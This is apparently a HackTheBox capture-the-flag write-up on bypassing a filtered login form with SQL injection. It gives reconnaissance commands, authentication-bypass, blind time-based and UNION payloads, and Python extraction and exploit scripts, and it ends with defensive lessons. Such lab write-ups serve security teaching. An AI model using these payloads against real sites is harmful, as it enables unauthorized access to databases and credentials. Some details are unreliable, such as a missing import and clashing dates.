---
title: "HTB: SQL Injection Challenge - Advanced Bypass"
date: 2025-02-28 14:00:00 +0300
categories: [Challenges, Web-Exploitation]
tags: [ctf, sqli, web-security, database]
image:
  path: /assets/sqli-challenge.png
  alt: SQL Injection Challenge
---

## 🎯 Challenge Overview

**Platform**: HackTheBox  
**Category**: Web Exploitation  
**Difficulty**: Medium  
**Points**: 50  
**Skills**: SQL Injection, Authentication Bypass, Database Enumeration

---

## 📋 Problem Statement

*"You've discovered a login portal for a corporate application. The developers 
claim they've implemented protection against SQL injection. Can you find a way 
to bypass the authentication and retrieve sensitive information from the database?"*

**Target**: `http://challenge.htb:8080/login`

**Objective**: 
- Bypass authentication mechanism
- Extract database credentials
- Retrieve the flag from admin table

---

## 🔍 Initial Reconnaissance

### Step 1: Information Gathering
```bash
# Port scanning
nmap -sV -sC challenge.htb

# Web enumeration
gobuster dir -u http://challenge.htb:8080 -w wordlist.txt

# Technology fingerprinting
whatweb http://challenge.htb:8080
```

**Findings**:
- PHP 7.4 backend
- MySQL database
- No WAF detected initially
- Login form at `/login.php`

---

## 🛠️ Tools Used

- **Burp Suite**: Web proxy and request manipulation
- **SQLmap**: Automated SQL injection detection
- **curl**: Manual testing and exploitation
- **MySQL Client**: Database interaction
- **Python**: Custom exploitation scripts

---

## 🎯 Exploitation Approach

### Phase 1: Identifying the Vulnerability

**Testing Basic SQL Injection**:
```sql
# Test payload in username field
admin' OR '1'='1' -- -

# Response: Login failed - Protected against basic SQL injection
```

**Testing for Blind SQL Injection**:
```sql
# Time-based blind SQLi
admin' AND SLEEP(5) -- -

# Response: Page delayed by 5 seconds - VULNERABLE!
```

### Phase 2: Bypassing WAF Protection

The application appeared to filter common SQL keywords. Testing revealed:
```python
# Bypass technique: Case manipulation and comments
username = "admin' /**/AND/**/SLEEP(5)/**/-- -"

# Bypass technique: URL encoding
username = "admin%27%20AND%20SLEEP(5)%20--%20-"

# Successful bypass: Using alternative syntax
username = "admin' AND IF(1=1, SLEEP(5), 0) -- -"
```

### Phase 3: Database Enumeration

**Extract Database Name**:
```sql
admin' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) -- -
# Iterate through alphabet to discover: 'corporate_db'
```

**Python Script for Automation**:
```python
import requests
import string

def blind_sqli_extract(query, position):
    """Extract data using blind SQL injection"""
    url = "http://challenge.htb:8080/login.php"
    
    for char in string.printable:
        payload = f"admin' AND IF(SUBSTRING(({query}),{position},1)='{char}', SLEEP(3), 0) -- -"
        data = {'username': payload, 'password': 'dummy'}
        
        start = time.time()
        r = requests.post(url, data=data)
        duration = time.time() - start
        
        if duration >= 3:
            return char
    return None

# Extract database name
db_name = ""
for i in range(1, 20):
    char = blind_sqli_extract("database()", i)
    if char:
        db_name += char
    else:
        break

print(f"Database: {db_name}")
```

### Phase 4: Extracting Credentials

**Enumerate Tables**:
```sql
admin' AND IF(
    (SELECT COUNT(*) FROM information_schema.tables 
     WHERE table_schema='corporate_db')>5, 
    SLEEP(5), 0
) -- -
```

**Tables Found**:
- `users`
- `admin_credentials`
- `flags`

**Extract Admin Password Hash**:
```sql
admin' UNION SELECT 1,password,3 FROM admin_credentials WHERE username='admin' -- -
```

**Result**: `$2y$10$abcd...1234` (bcrypt hash)

### Phase 5: Privilege Escalation

**Direct Flag Extraction**:
```sql
admin' UNION SELECT 1,flag,3 FROM flags WHERE id=1 -- -
```

---

## 🎬 Complete Exploit Script
```python
#!/usr/bin/env python3
import requests
import time
from urllib.parse import quote

TARGET = "http://challenge.htb:8080/login.php"

def exploit():
    """Complete exploitation script"""
    
    # Bypass authentication with UNION injection
    payload = "admin' UNION SELECT 1,'admin','admin' FROM flags -- -"
    
    data = {
        'username': payload,
        'password': 'admin'
    }
    
    session = requests.Session()
    response = session.post(TARGET, data=data)
    
    if "Welcome" in response.text:
        print("[+] Authentication bypassed successfully!")
        
        # Extract flag
        flag_payload = "admin' UNION SELECT 1,flag,3 FROM flags -- -"
        data['username'] = flag_payload
        
        flag_response = session.post(TARGET, data=data)
        
        # Parse flag from response
        flag = extract_flag(flag_response.text)
        print(f"[+] Flag captured: {flag}")
        return flag
    
    return None

def extract_flag(html):
    """Extract flag from HTML response"""
    import re
    match = re.search(r'HTB\{[^\}]+\}', html)
    return match.group(0) if match else None

if __name__ == "__main__":
    exploit()
```

---

## 📊 Results

**Flag Retrieved**: `HTB{bl1nd_sql1_w1th_w4f_byp4ss_ftw}`

**Time to Complete**: 3 hours 45 minutes

**Key Achievements**:
- Successfully bypassed WAF filtering
- Implemented blind SQL injection automation
- Extracted database structure and credentials
- Retrieved flag using UNION-based injection

---

## 🎓 Key Lessons Learned

### Technical Insights
1. **WAF Bypass Techniques**: 
   - Case manipulation, comments, and encoding are effective bypass methods
   - Always test multiple payload variations

2. **Blind SQL Injection**:
   - Time-based techniques are reliable when error messages are suppressed
   - Automation is essential for efficient data extraction

3. **Input Validation**:
   - Blacklist filtering is insufficient for SQL injection prevention
   - Parameterized queries are the only effective defense


## 🔗 References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [HackTheBox Academy: SQL Injection Module](https://academy.hackthebox.com/)

---

**Challenge Status**: ✅ Solved  
**Completion Date**: February 28, 2024

*Writeup published with permission from HackTheBox*
